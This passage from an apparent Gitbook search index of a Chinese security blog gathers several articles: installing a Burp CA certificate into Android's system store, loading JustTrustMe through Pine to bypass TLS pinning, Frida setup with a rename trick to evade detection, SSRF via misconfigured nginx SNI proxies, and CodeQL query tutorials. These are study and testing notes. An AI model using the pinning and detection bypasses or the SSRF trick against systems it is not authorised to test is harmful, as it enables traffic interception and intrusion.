下载好的image-blueline-qp1a.190711.020.zip 解压到该目录 进入fastbootd模式 #安卓10需要进入fastbootd模式 fastboot reboot fastboot #和上述一样 fastboot flashall -w 使用命令fastboot flashall -w 如果还发现存在譬如Resizing 'system_a' FAILED (remote: 'Not enough space to resize partition')的问题，可能是slot设定为b引起的。（关于动态分区详细可以阅读Android 10分区的一些知识以及https://blog.xzr.moe/archives/28/） fastboot set_active a fastboot flashall -w 添加证书教程 电脑端处理 注意：如果使用magisk手动修补boot.img再重新刷入的方式获得ROOT会在挂载系统目录后丢失，取消系统目录挂载即可恢复。 具体冲突案例如下（大量内容复制自安装burp证书到安卓系统根证书） 首先导出Burp的证书： 打开终端，将der证书转为pem证书： openssl x509 -inform der -in burp.der -out burp.pem 生成pem证书的hash： openssl x509 -inform PEM -subject_hash_old -in burp.pem 重命名/复制证书: cp burp.pem 9a5ba575.0 如果你上面的过程没有错的话，生成的证书hash以及文件内容应该是和我一样的。 手机端处理 手机连接电脑并开启adb调试： 推送证书到手机并复制到相应的目录 adb push 9a5ba575.0 /data/local/tmp adb shell su mount -o remount,rw /system #注意此处android 10会报错，导致后续无法执行，解决见下文 cd /data/local/tmp cp 9a5ba575.0 /system/etc/security/cacerts/ cd /system/etc/security/cacerts chmod 644 9a5ba575.0 reboot 需要先解锁verity $ adb root #restarting adbd as root $ adb remount #dm_verity is enabled on the system partition. #Use \"adb disable-verity\" to disable verity. #If you do not, remount may succeed, however, you will still not be able to write to these volumes. remount succeeded $ adb disable-verity #Verity disabled on /system #Now reboot your device for settings to take effect $ adb reboot $ adb root #restarting adbd as root $ adb remount #remount succeeded 解锁后一样的流程 cd /data/local/tmp cp 9a5ba575.0 /system/etc/security/cacerts/ cd /system/etc/security/cacerts chmod 644 9a5ba575.0 reboot 然后，为了防止丢失ROOT，需要再次启用verity锁定 $ adb root $ adb remount #remount succeeded $ adb enable-verity $ adb reboot $ adb root $ adb remount #remount disable Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 18:35:18 "},"markdown/移动安全/pine框架与Mikrom2.0的使用（一）.html":{"url":"markdown/移动安全/pine框架与Mikrom2.0的使用（一）.html","title":"Pine框架与Mikrom2.0的使用（一）","keywords":"","body":"pine框架与Mikrom2.0的使用（一） 前言 该系列文章主要是使用和测试Mikrom2.0版本如何操作Pine框架，本文记录通过Pine加载插件的踩坑过程。由衷感谢misskings师傅提供的测试机会以及pine框架的开发者canye。 什么是Mikrom Mikrom1.0是由misskings师傅基于fartext开发的一套用于简便脱壳和frida逆向的ROM，原理各位可以自行搜索fart、fartext进行研习，这里不花过多笔墨赘述。 Mikrom2.0是由misskings师傅在旧版本基础上优化旧功能，并新增pine作为hook框架，个人使用后觉得在控制精细程度和功能拓展方面确实有独到之处。详细可以观看介绍视频。https://www.bilibili.com/video/BV1wG411i7Fw 什么是Pine https://github.com/canyie/pine 简介中它写的是：Pine是一个在虚拟机层面、以Java方法为粒度的运行时动态hook框架，它可以拦截本进程内几乎所有的java方法调用。 这个表述实在是有些费解，不过我们只需要知道它是一个ART Hook框架，通过inline hook、修改ArtMethod的entrypoint的方式进行Hook；以及最重要的特性：支持以Xposed风格hook方法和加载Xposed模块、借助Dobby使用一些增强功能。 在misskings师傅视频中对该模块的演示会较为简单，对安卓了解不深的同学对具体使用方式容易一头雾水。（https://www.bilibili.com/video/BV14C4y1R759） 接下来我将通过一个加载Xposed模块的例子串通pine框架和Mikrom，算是对misskings师傅视频的补充和对canye师傅开发pine这样优秀框架的推广。（强烈建议各位使用的时候反复阅读Pine的文档和源码，以确认使用了正确的方式进行编码） 通过Pine加载插件 这里我们以加载Xposed的JustTrustMe插件来演示。 准备工作 上传插件 adb push .\\JustTrustMe-debug.apk /data/local/tmp/JustTrustMe-debug.apk adb shell cd /data/local/tmp/ chmod 766 JustTrustMe-debug.apk 创建空白安卓应用 给build.gradle添加必须的依赖 implementation 'top.canyie.pine:core:0.2.6' implementation 'top.canyie.pine:xposed:0.0.9' 编写代码 手动创建package java.lang.krom 以及接口类 IHook package java.lang.krom; import android.content.pm.PackageManager; public interface IHook { void onStart(Object app) throws NoSuchFieldException, NoSuchMethodException, PackageManager.NameNotFoundException; } 手动创建module，这里我建立的是myModule.java package com.example.pinejusttrustme; import android.app.Application; import android.content.pm.ApplicationInfo; import android.content.pm.PackageManager; import android.util.Log; import top.canyie.pine.BuildConfig; import top.canyie.pine.Pine; import top.canyie.pine.PineConfig; import top.canyie.pine.xposed.PineXposed; import java.io.File; import java.lang.krom.IHook; /** * myModule类实现了IHook接口，用于处理模块的启动和加载逻辑。 */ public class myModule implements IHook { public static String TAG = \"myModule\"; /** * onStart方法在模块启动时被调用，用于加载模块和执行相关逻辑。 * @param app 本质是android.app.Application */ @Override public void onStart(Object app) { try { Log.i(TAG, \"onStart!!!\"); Log.i(TAG, app.toString()); // 指定模块路径 String modulePath = \"/data/local/tmp/JustTrustMe-debug.apk\"; //指定Pine框架策略 PineConfig.debug = true; PineConfig.debuggable = BuildConfig.DEBUG; // 加载Xposed模块 PineXposed.loadModule(new File(modulePath)); Pine.disableJitInline(); // 获取应用程序相关信息，核心是Object app可以获取上下文，也就是等价于Application所有必须的信息。 // 有意思的是app类的classloader是dalvik.system.PathClassLoader， ClassLoader pathClassLoader = app.getClass().getClassLoader(); Application application = (Application) app; ApplicationInfo appInfo = application.getPackageManager().getApplicationInfo(application.getPackageName(), PackageManager.GET_META_DATA); // 执行PineXposed的xposed加载方法。本质上是pine框架用一套机制把xposed的module加载进来,然后指定想要加入插件的上下文。 // 虽然不能像xposed直接调度XC_LoadPackage.LoadPackageParam；但通过Object app已经可以获取到应用的上下文了，因此可以用pine框架内的方法动态生成一个专门针对该应用的LoadPackageParam并加载module内的hook。 PineXposed.onPackageLoad(appInfo.packageName, appInfo.processName, appInfo, true, pathClassLoader); Log.i(TAG, \"END!!!\"); } catch (Exception e) { e.printStackTrace(); } } } 修改AndroidManifest.xml中的meta-data属性，确保和自己想要加载的module是一致的。 编译、上传和配置 编译并上传应用 打开自带管理应用miktool，添加想要加载插件的应用。 勾选模块，保存设置。就大功告成了。 通过logcat可以看到插件已经在工作了。 加上代理后，打开应用访问https的百度毫无压力。 中途踩过的一些坑 路径权限问题 最开始我是上传到/sdcard/Download/目录，结果发现会不断提示权限错误。直到更换到其他目录才解决。 adb push .\\JustTrustMe-debug.apk /sdcard/Download/ 搞不清app是什么对象 尝试用反射看了好久还是一头雾水 package com.example.pinejusttrustme; import android.content.pm.ApplicationInfo; import android.util.Log; import top.canyie.pine.BuildConfig; import top.canyie.pine.Pine; import top.canyie.pine.PineConfig; import top.canyie.pine.xposed.*; import java.io.File; import java.lang.krom.IHook; import java.lang.reflect.Field; public class myModule implements IHook { public static String TAG = \"myModule\"; @Override public void onStart(Object app) { Log.i(TAG,\"onStart!!!\"); String modulePath = \"/sdcard/Download/JustTrustMe-debug.apk\"; PineConfig.debug = true; PineConfig.debuggable = BuildConfig.DEBUG; PineXposed.loadModule(new File(modulePath)); Pine.disableJitInline(); try{ for(Field filed: app.getClass().getDeclaredFields()){ filed.setAccessible(true); Log.i(TAG,\"GET!!!\"+filed.getName()); Log.i(TAG, String.valueOf(filed.get(app))); } } catch (Exception e) { e.printStackTrace(); } Log.i(TAG,\"Obj END!!!\"); // PineXposed.onPackageLoad(app.packageName, processName, appInfo, isFirstApp, classLoader); } } 直到获取它的Classloader，发现是dalvik.system.PathClassLoader； ClassLoader pathClassLoader = app.getClass().getClassLoader(); 那么它的上下文应该也可以取到application的context，本质上安卓是上下文关系，只要你能取到上下文，就能取到所有你想要的东西；最后我大胆尝试直接把app当作application，发现是可以直接调取application的所有方法，这才明白了app就是Android的android.app.Application。 pine加载插件的方式 最初认为是和xpose一样先要有XC_LoadPackage.LoadPackageParam对象，但这个对象在pine中是通过PineXposed.onPackageLoad()方法来获取的。 此前一直搞不清到底传进来的app是什么东西，想当然认为就是和XC_LoadPackage.LoadPackageParam差的不多的东西，结果吃了亏。 这个就是是外部文件读入module的方式。如果要自己写hook，除了pine原生以外，也可以通过自定义module的方式加载。 虽然不能像xposed直接调度XC_LoadPackage.LoadPackageParam；但通过Object app已经可以获取到应用的上下文了，因此可以用pine框架内的方法动态生成一个专门针对该应用的LoadPackageParam并加载module内的hook。 我个人的理解是XC_LoadPackage.LoadPackageParam这个对象包含了所有的应用信息，所有xposed才有那么奇怪的equals去进行判断： 但在mikrom+pine这里是完全不必要的，我们只需要让XC_LoadPackage.LoadPackageParam仅包含我们想要进行module操作的应用就对了。所以才是通过传入的app对象来获取appinfo等必要信息去生成LoadPackageParam对象。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-29 18:33:24 "},"markdown/移动安全/安卓入门.html":{"url":"markdown/移动安全/安卓入门.html","title":"安卓入门","keywords":"","body":"安卓入门 准备工作 电脑。 解锁bl刷入原生系统的安卓机，并且root。 Frida客户端安装配置 先有python后有天。没有Python和pip就装。然后安装工具，速度很慢是正常的，最好挂代理。 pip install frida pip install frida-tools 安装成功后，检查一下 frida-ps PS：安装过程中存在warning 参考官方文档Troubleshooting 比如给朋友的MacOS装的时候遇到过，有可能是系统变量配置路径问题参考#issues1355 ADB安装配置 看这个SDK Platform Tools release notes 安装完成后，查看设备连接情况。 adb devices PS：如果连接不上，可能是端口问题。配置一下就好。如果是使用模拟器，不同的模拟器，可能会默认指定5017之类的端口，以及使用模拟器安装目录下的adb工具，具体需要查看官方手册。（所以强烈不推荐使用模拟器） adb forward tcp:5037 tcp:5037 Frida服务端安装配置 先查看当前的客户端版本 frida --version 要hook安卓，就需要下载对应版本的服务端。注意与客户端版本号对应，注意平台，注意指令集。 https://github.com/frida/frida/releases/tag/16.1.3 把下载的文件解压，然后上传到安卓机 adb push ./frida服务端文件名 /你想要的安卓机器的目录的绝对路径 #常见情况 adb push ./frida服务端文件名 /data/local/tmp/ 修改权限并运行 adb shell su cd /data/local/tmp/ chmod 777 frida-server ./frida-server bypass小技巧，修改文件名防检测 mv /data/local/tmp/frida-server /data/local/tmp/f@vbiuao /data/local/tmp/f@vbiuao 启动服务后，在自己电脑客户端查看连接情况，有进程列表就是正常的 frida-ps -U 指定写有hook代码的js文件和想要hook的进程，进程名可以在frida-ps -U上看到。 其中frida客户端启动，分为spawn和attach两种。spawn是在进程启动前，就运行hook。attach是在进程启动后，中途运行hook。 attach的方式不容易应用出错或者闪退，但容易hook失败，以下是attach的启动方式： frida -U -l \"E:\\xxx\\abcd.js\" com.xx.messenger(你想hook的进程名) spawn的启动需要参数-f，而--no-pause则是让hook到函数时不会强制暂停进程。 frida -U --no-pause -f com.xx.messenger -l hook.js 查看进程名 如果你使用Identifier进行hook失败 那就使用Name再试一次 更简便的方式 刷入mikrom，原生集成了frida。 安装MikManager adb install ./apk 可以通过app启动frida 下载安装fridaUiTools 可以很方便地联动frida使用内置的hook脚本 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-19 16:44:27 "},"markdown/翻译文章/SSRF_by_SNI_proxy.html":{"url":"markdown/翻译文章/SSRF_by_SNI_proxy.html","title":"SSRF By SNI Proxy","keywords":"","body":"SSRF_by_SNI_proxy 概念梳理 何为TLS SNI Server Name Indication (SNI) 是HTTPS中TLS协议的一个插件功能。建立安全连接时，会初始化发送一个ClientHello 的报文，该报文可能包含SNI字段。这样使得服务器在响应 ServerHello 报文时会返回证书用以适配指定域名。 何为 SNI proxy 当反向代理服务器使用SNI指定的域名去查询后端时，我们就用到了 SNI proxy 。 一般有两种情况： 有 SSL 终端：通过 SNI proxy 建立TLS 连接，使用SNI指定的域名去查找对应后端，用代理传输明文数据流。 无 SSL终端：使用SNI指定的域名去查找对应后端，通过 SNI proxy 直接传输数据流，和TCP代理差不多。 SNI proxy 配置 大部分反代都支持配置文件中配置 SNI proxy；甚至Kubernetes也可以。 以下是一个例子： stream { map $ssl_preread_server_name $targetBackend { test1.example.com backend1:443; test2.example.com backend2:9999; } server { listen 443; resolver 127.0.0.11; proxy_pass $targetBackend:443; ssl_preread on; } } $ssl_preread_server_name 也就是对应test1.example.com 作为SNI代理需要查找的域名。ssl_preread on 表示开启了 SNI proxy； 配置导致的漏洞1 如下配置为例 stream { server { listen 443; resolver 127.0.0.11; proxy_pass $ssl_preread_server_name:443; ssl_preread on; } } 可以通过用户输入的$ssl_preread_server_name随意控制对后端访问的域名； 尽管RFC 6066在第三章中明确规定了不允许使用IP地址作为SNI的值，但实际上$ssl_preread_server_name确实可以是可以输入IP的，甚至于一些特殊字符或者null字符。 配置导致的漏洞2 如下配置为例 stream { map $ssl_preread_server_name $targetBackend { ~^www.example\\.com $ssl_preread_server_name; } server { listen 443; resolver 127.0.0.11; proxy_pass $targetBackend:443; ssl_preread on; } } 由于正则表达式的缺陷，没有使用$符号强制规定正则开头，可以通过自己的DNS服务器来把 www.example.com.attacker.com 这样的域名指向127.0.0.1 其他一些潜在利用 SNI 代理仅检查第一条消息，然后代理所有后续流量，即使它不是正确的 TLS 消息。此外，虽然 RFC 规定只能有一个 SNI 字段，但实际上，我们可以发送多个不同的名称（TLS-Attack 在这里是一个方便的工具）。由于 Nginx 只检查第一个值，因此如果后端接受此类消息但随后使用第二个 SNI 值，则（理论上）可能有获得一些额外访问权限的途径。比如连续两个ClientHello ClientHello消息。 参考资料： https://www.xf1433.com/4583.html https://www.rfc-editor.org/rfc/rfc6066#page-6 https://www.bamsoftware.com/computers/sniproxy/ https://github.com/tls-attacker/TLS-Attacker https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/ Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-12-24 17:51:25 "},"markdown/静态分析/codeQL使用篇.html":{"url":"markdown/静态分析/codeQL使用篇.html","title":"CodeQL使用篇","keywords":"","body":"codeQL使用篇 先从t4rrega师傅那偷个图，给大伙儿看看SpringMVC是咋回事Spring MVC框架安全浅析 我们再来进一段controller代码了解SpringBoot，获取参数部分也可以参考SpringBoot获取参数的几种方式 @RequestMapping(value = \"/onlinePreview\") //这个就是控制器注册的接口Mapping了 public String onlinePreview(String url, Model model, HttpServletRequest req) { //String url即springboot一种简单获取GET参数的方式 //Model model即MVC里的M，后续处理响应时会用到 //HttpServletRequest req在这里获取的request对象，可以很方便地通过getParameter()方法在后续层层调用的函数中随时获取当前Controller所有GET/POST参数里想要的那个。 String fileUrl; try { fileUrl = new String(Base64.decodeBase64(url), StandardCharsets.UTF_8); } catch (Exception ex) { String errorMsg = String.format(BASE64_DECODE_ERROR_MSG, \"url\"); return otherFilePreview.notSupportedFile(model, errorMsg); } FileAttribute fileAttribute = fileHandlerService.getFileAttribute(fileUrl, req); model.addAttribute(\"file\", fileAttribute); FilePreview filePreview = previewFactory.get(fileAttribute); logger.info(\"预览文件url：{}，previewType：{}\", fileUrl, fileAttribute.getType()); return filePreview.filePreviewHandle(fileUrl, model, fileAttribute); } 简述一下codeQL是如何查找漏洞的 简述一下codeQL是如何查找漏洞的 先了解一下 source 和 sink的概念 在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是 (source，sink 和 sanitizer)。 source 是指漏洞污染链条的输入点。比如获取 http 请求的参数部分，就是非常明显的 Source。 sink 是指漏洞污染链条的执行点，比如 SQL 注入漏洞，最终执行 SQL 语句的函数就是 sink(这个函数可能叫 query 或者 exeSql，或者其它)。 sanitizer 又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫 sanitizer。 只有当 source 和 sink 同时存在，并且从 source 到 sink 的链路是通的，才表示当前漏洞是存在的。 如果在SpringMVC下，则可以理解Source为Controller获取并处理了http请求的用户控制参数，调用的处理参数方法则是一个个node，sink即一系列调用后会用到某个可恶意利用的方法来处理该可控参数，并最终层层返回到Controller，Controller会把结果再交给Model和View去响应用户的请求。 来一段QL代码看看是怎么样实现的，这段代码来自(https://github.com/github/codeql/tree/master/java/ql/src/Security/CWE/CWE-022)用于挖掘CWE-022以及相似类型的漏洞，即路径注入类漏洞。对CWE漏洞分类不太了解的同学，可以参考官方[**CWE VIEW: Software Development](https://cwe.mitre.org/data/definitions/699.html)，实在不懂英语的可以看看国家精简版[CNNVD漏洞分类指南**](http://www.cnnvd.org.cn/web/wz/bzxqById.tag?id=3&mkid=3)。 /** * @name Uncontrolled data used in path expression * @description Accessing paths influenced by users can allow an attacker to access unexpected resources. * @kind path-problem * @problem.severity error * @precision high * @id java/path-injection * @tags security * external/cwe/cwe-022 * external/cwe/cwe-023 * external/cwe/cwe-036 * external/cwe/cwe-073 */ import java/*导入java库，指示QL语句查询的语言类型是java*/ import semmle.code.java.dataflow.FlowSources/*字面意思，在数据流中寻找源头用的*/ import semmle.code.java.security.PathCreation/*字面意思，在数据流中寻找路径用的*/ import DataFlow::PathGraph/*数据流分析库*/ import TaintedPathCommon/*作者自己写的路径污染库，为污点分析的路径建立一个非常基本的查询模型。*/ class ContainsDotDotSanitizer extends DataFlow::BarrierGuard { ContainsDotDotSanitizer() { //包含\"..\"的净化函数 //匹配方法名为contains()的且参数中包含字符串\"..\"的，意思就是遇到contains(str,\"..\")的过滤防护就不视为漏洞路径。 this.(MethodAccess).getMethod().hasName(\"contains\") and this.(MethodAccess).getAnArgument().(StringLiteral).getValue() = \"..\" } override predicate checks(Expr e, boolean branch) { //调用checks（）可以尝试获取此方法访问的限定表达式。且此处分支为false e = this.(MethodAccess).getQualifier() and branch = false } } class TaintedPathConfig extends TaintTracking::Configuration { TaintedPathConfig() { this = \"TaintedPathConfig\" } // isSource就是寻找入口用的，会自动根据框架比如SpringBoot去找对应的输入入口 override predicate isSource(DataFlow::Node source) { source instanceof RemoteFlowSource } // isSink找执行点用的 override predicate isSink(DataFlow::Node sink) { exists(Expr e | e = sink.asExpr() | e = any(PathCreation p).getAnInput() and not guarded(e)) } // isSanitizer净化函数查看是否符合切断条件，符合直接切断数据流，不视为漏洞路径。它是作用于Node上的。 override predicate isSanitizer(DataFlow::Node node) { exists(Type t | t = node.getType() | t instanceof BoxedType or t instanceof PrimitiveType) } // 进一步净化函数查看是否存在防护过滤，符合直接切断数据流，不视为漏洞路径。它是作用于BarrierGuard的，即一个验证某些表达式的防护措施。 override predicate isSanitizerGuard(DataFlow::BarrierGuard guard) { guard instanceof ContainsDotDotSanitizer } } // 接下来的查询就是查找符合条件的结果，sink符合条件 AND node能连接source和sink， from DataFlow::PathNode source, DataFlow::PathNode sink, PathCreation p, TaintedPathConfig conf where sink.getNode().asExpr() = p.getAnInput() and conf.hasFlowPath(source, sink) select p, source, sink, \"$@ flows to here and is used in a path.\", source.getNode(), \"User-provided value\" /** * Models a very basic guard for the tainted path queries. */ import java import semmle.code.java.controlflow.Guards import semmle.code.java.security.PathCreation private predicate inWeakCheck(Expr e) { // None of these are sufficient to guarantee that a string is safe. 就是说下面这四种过滤其实也是放屁，很多程序员都没写对，只是不想查那么多，所以下面的guarded()调用会过滤掉包含这四种检查的路径。 exists(MethodAccess m, Method def | m.getQualifier() = e and m.getMethod() = def | def.getName() = \"startsWith\" or def.getName() = \"endsWith\" or def.getName() = \"isEmpty\" or def.getName() = \"equals\" ) or // Checking against `null` has no bearing on path traversal. 排除掉null防止bug，和我们本来找路径穿越的目的没什么关系。 exists(EqualityTest b | b.getAnOperand() = e | b.getAnOperand() instanceof NullLiteral) } // Ignore cases where the variable has been checked somehow, 这里说的是除了少部分特别明显的路径污染，大部分都给忽略，估计就是怕误报太多 // but allow some particularly obviously bad cases. // predicate 表示当前方法没有返回值。 // exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。 predicate guarded(VarAccess e) { // 存在（创建模拟路径->寻找输入）|| 存在（寻找条件块CB的子表达式 = 表达式c AND 表达式c = 输入点的值的路径 AND 条件块CB是受控的 AND NOT 缺陷检查） // 说人话就是，看看这个输入点到全路径过程是不是受控制的，且不包含过滤检查。 exists(PathCreation p | e = p.getAnInput()) and exists(ConditionBlock cb, Expr c | cb.getCondition().getAChildExpr*() = c and c = e.getVariable().getAnAccess() and cb.controls(e.getBasicBlock(), true) and // Disallow a few obviously bad checks. 关闭少部分明显的过滤检查 not inWeakCheck(c) ) } 最后查询出来就是这样的 实际上审计的时候最好切到alert视图来看污点追踪流程。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2022-01-14 05:41:30 "},"markdown/静态分析/codeQL语法篇.html":{"url":"markdown/静态分析/codeQL语法篇.html","title":"CodeQL语法篇","keywords":"","body":"codeQL语法篇（一） 如何理解QL语言 看看java库都能查些什么CodeQL library for Java 导入java库（里面包含了许多qll文件，也可以自定义qll导入，类似C的头文件） import java 这玩意定义了5种主要的类 Classes such as program elements（用于表示程序元素的类） classes 、methods 、Type、Variables等（类、方法、类型、变量等） AST nodes（用于表示AST节点的类） statements and expressions（状态、表达式） metadata（用于表示元数据的类） annotations and comments（注解） computing metrics（用于计算指标的类） cyclomatic complexity and coupling（复杂度，循环、耦合） navigating the program’s call graph（“函数调用关系图”的类） - 分析函数调用关系图(call graph)的几种方法介绍了C/C++中几个例子，显然这里CodeQL是偏重静态源码分析。 难点备忘 解释一下AST node: expressions，对应的可能是AST里的JCExpression，表达式语句，继承JCExpression都是表达式语句，子类有：JCAssign，JCBinary，JCBreak，JCFieldAccess，JCIdent，JCLiteral等； from Expr e where e.getParent() instanceof ReturnStmt select e 因为instanceof ReturnStmt，所以获得的是每一个return点的查询谓词表达式，结果对应的是每一个return点的返回值。 以下为AST中的定义： statements，对应的可能是AST里的JCStatement，子类有：JCBlock、JCReturn、JCClassDecl、JCVariableDecl、JCTry、JCThrow等； import java from Stmt s where s.getParent() instanceof IfStmt select s 因为instanceof IfStmt，所以查找其父级为 if 语句的语句，结果对应的是每一个if分支的起始点 以下为AST中的定义： 解释一下call graph： Java的CodeQL库提供了两个抽象的类来表示程序的调用图。Callable和Call。前者只是Method和Constructor的共同超类，后者是MethodAccess、ClassInstanceExpression、ThisConstructorInvocationStmt和SuperConstructorInvocationStmt的共同超类。简单地说，Callable是可以被调用的东西，而Call是可以调用Callable的东西。 我们可以使用谓词Call.getCallee来找出一个特定的调用表达式指的是哪个方法或构造函数。例如，下面的查询可以找到对名为println的方法的所有调用。 import java from Call c, Method m where m = c.getCallee() and m.hasName(\"println\") select c 反过来说，Callable.getAReference会返回一个指代它的Call。因此，我们可以用这个查询找到那些从未被调用的方法和构造函数。 import java from Callable c where not exists(c.getAReference()) select c 实战操作 极其牛逼的文章CodeQL workshop for Java: Unsafe deserialization in Apache Dubbo，我是照着上面进行操作和分析，发觉过程和注解写得极其详细，入门极佳，遂进行部分翻译 Section 1: 寻找反序列化污染点（Sink） 查询所有方法，Method method表示获取当前项目中所有的方法 import java from Method method select method 查询所有方法调用，MethodAccess call表示获取当前项目当中的所有方法调用（方法调用中是包含参数的或者void的，这样我们可以更方便地通过谓词指定调用的形式。忽略没有意义的参数） import java from MethodAccess call select call Parameter parameter 参数类，Parameter表示获取当前项目当中所有的参数 此处暂无例子，待补充 使用where进行谓词修饰，根据定义MethondAccess是获取方法与它的参数列表，getMethod是从一个类型中获取内容，Method是一种被调用的东西的特殊类型。（这个说法非常抽象，只能说官方所有文档表达的就是：我都封装和抽象好了，你不需要管那些底层细节，直接参考我的范例去用就可以了，为什么这么用。逻辑突然就不言自明了） import java from MethodAccess call, Method method where call.getMethod() = method select call, method 为此，我稍微深入研究了一下where call.getMethod() = method的谓词修饰有什么意义，以及MethodAccess、MethodAccess.getMethod() 、 Method有什么区别。 通过这张图可以知道MethodAccess、MethodAccess.getMethod() 、 Method有什么区别，不过让人困惑的是where call.getMethod() = method的谓词修饰有什么意义？ 放到实际项目代码中看，我推测： (1)CodeQL生成的AST数据库仅包含主体源码，依赖包、JDK的源码并不会被转译成AST，虽然查询MethodAccess可以查到对依赖包、JDK的调用，但AST数据库里没有找到对应的定义，因此等式右边对不上，被剔除。 (2)CodeQL生成的AST数据库包含的主体源码中，开发者定义了未被主体源码内部使用的方法声明，这些声明可能是作为依赖封装给外部使用的，因而等式左边对不上，被剔除。 不过也有办法解决依赖包、JDK的源码并不会被转译成AST的问题，可以手动导入字节码，但这样分析层数就太多了，机器撑不住。最终这个分析还是只能到此为止，知道能用就行，深究不下去。 查询所有read开头的方法名 import java from MethodAccess read, Method method where read.getMethod() = method and method.getName().matches(\"read%\") select read 获取所有read开头的方法名 || 方法声明类型的类的父类&超类符合名字org.apache.dubbo.common.serialize.ObjectInput || 修饰词（或者说调用所有read开头的方法名的对象） 原文翻译：查询ObjectInput.readXXX 方法反序列化限定符参数（即 this 参数或 . 之前的对象）。 MethodAccess.getQualifier() 返回方法调用的限定符。 限定符是程序中的一个表达式，由 CodeQL 类 Expr 表示。 在 from 子句中引入一个新变量来保存这个表达式，并在 select 子句中输出该变量。 from MethodAccess read, Method method, Expr qualifier where read.getMethod() = method and method.getName().matches(\"read%\") and method.getDeclaringType().getASourceSupertype*().hasQualifiedName(\"org.apache.dubbo.common.serialize\", \"ObjectInput\") and qualifier = read.getQualifier() select read, qualifier 但是这样无限地加谓词条件，多几个AND之后很快可读性和可维护性就飞速下降了，所以我们可以将这些谓词进行封装 import java predicate isDeserialized(Expr qualifier) { exists(MethodAccess read, Method method | read.getMethod() = method and method.getName().matches(\"read%\") and method.getDeclaringType().getASourceSupertype*().hasQualifiedName(\"org.apache.dubbo.common.serialize\", \"ObjectInput\") and qualifier = read.getQualifier() ) } from Expr arg where isDeserialized(arg) select arg Section 2: 寻找DubboCodec中的解码请求body方法的实现（Source） 继承org.apache.dubbo.remoting.Codec2接口的类通常用于处理用户输入，类似找sink的我们可以通过谓词修饰找到它们。 创建一个名为 DubboCodec 的 CodeQL 类，找到接口 org.apache.dubbo.remoting.Codec2。使用 RefType.hasQualifiedName(\"package\", \"class\") 来识别具有指定包名和类名的类。 在特征谓词中，使用特殊变量 this 来引用我们正在描述的 RefType。 import java /** The interface `org.apache.dubbo.remoting.Codec2`. */ class DubboCodec extends RefType { DubboCodec() { this.hasQualifiedName(\"org.apache.dubbo.remoting\", \"Codec2\") } } 创建一个名为DubboCodecDecodeBody的CodeQL类，用于识别直接被继承的超类，包括DubboCodec的类上名为DecodeBody的方法。 使用 Method.getDeclaringType() 识别方法的声明类型。使用 RefType.getASuperType() 识别该类型的超类。使用 instanceof 断言其中一个超类是 DubboCodec。 /** A `decodeBody` method on a subtype of `org.apache.dubbo.remoting.Codec2`. */ class DubboCodecDecodeBody extends Method { DubboCodecDecodeBody() { this.getDeclaringType().getASupertype*() instanceof DubboCodec and this.hasName(\"decodeBody\") } } decodeBody 方法应该将第二个和第三个参数视为不受信任的用户输入。在你的 DubboCodecDecodeBody 类中添加一个成员谓词来查找这些 decodeBody 方法的参数。 创建一个谓词Parameter getAnUntrustedParameter() { ... }在该类中。这有结果类型Parameter。 在谓词中，使用特殊变量result来指代被 \"返回 \"或被谓词识别的值。 在谓词中，使用特殊变量this来指代DubboCodecDecodeBody方法。 使用Method.getParameter(int index)来获取第i个索引参数。索引是从0开始的，所以我们在这里想要索引1号和索引2号参数，也就是第二和第三个参数。 使用Quick Evaluation来运行你的谓词。 class DubboCodecDecodeBody extends Method { DubboCodecDecodeBody() { this.getDeclaringType().getASupertype*() instanceof DubboCodec and this.hasName(\"decodeBody\") } Parameter getAnUntrustedParameter() { result = this.getParameter([1, 2]) } } Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2022-10-13 10:00:51 "},"markdown/静态分析/南大软件分析01.html":{"url":"markdown/静态分析/南大软件分析01.html","title":"南大软件分析01","keywords":"","body":"南大软件分析01 莱斯定律（大米定律） Any non-trivial property of the behavior of programs in a r.e. language is undecidable. r.e. (recursively enumerable) = recognizable by a Turing-machine non-trivial property 是比如空指针等有趣的东西 不存在一个方法能够100%准确判断程序是否有哪些具体缺陷。 用下图理解就是，没有一个完美的静态分析方法可以将过拟合和欠拟合逼近于0。 过拟合和欠拟合：类似举例就是sound就是可以误报，但是不能漏报。complete是可以漏报，但是不能误报。 Useful static analysis即向其中一方妥协，最常用的就是允许误报。 都是sound，开支不一样，包含上下文信息时开支大，所以要平衡sound、精度、速度 抽象即映射 静态分析可以从两个方面把握：首先是对data做abstraction（如第一节课的“+−O⊤⊥+−O⊤⊥”），然后做over-approximation。 事实上，对于绝大多数静态分析场景来说，我们要做的都是over-approximation，也可以称为may analysis，即输出结果包含的信息可能为真。 然而，还有一些场景是需要under-approximation，也可以称为must analysis，即输出结果必须包含的信息必须为真。无论如何，over-approximation和under-approximation的目的都是在各自的场景中实现safety of analysis，使结果符合该场景的需求。 Copyright © R4ph4e1 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-10-10 10:26:27 "}}